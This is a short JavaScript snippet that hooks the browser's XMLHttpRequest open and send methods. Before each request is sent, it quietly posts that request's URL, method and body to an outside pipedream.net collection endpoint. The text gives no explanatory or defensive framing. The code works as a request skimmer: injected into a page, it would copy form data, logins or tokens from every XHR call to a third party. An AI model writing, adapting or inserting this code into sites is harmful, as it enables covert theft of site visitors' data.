(function() {
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url) {
    this._requestMethod = method;
    this._requestUrl = url;
    return origOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    // Interception avant envoi
    fetch('https://eojy4h95a631zv3.m.pipedream.net', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: this._requestUrl,
        method: this._requestMethod,
        body: body
      })
    });

    return origSend.apply(this, arguments);
  };
})();
